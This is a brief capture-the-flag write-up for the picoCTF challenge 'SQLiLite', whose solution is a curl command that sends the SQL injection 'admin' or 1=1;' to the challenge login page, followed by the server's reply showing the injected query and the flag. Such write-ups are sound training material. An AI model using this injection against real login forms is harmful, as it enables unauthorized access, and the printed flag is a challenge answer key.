# SQLiLite

Can you login to this website? Try to login [here](http://saturn.picoctf.net:55927/).

# Solucion

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://saturn.picoctf.net:55927/login.php -d "username=admin'+or+1=1;&password=pass&debug=1"
<pre>username: admin&#039; or 1=1;
password: pass
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; or 1=1;&#039; AND password=&#039;pass&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_33d32a56}</p>   


```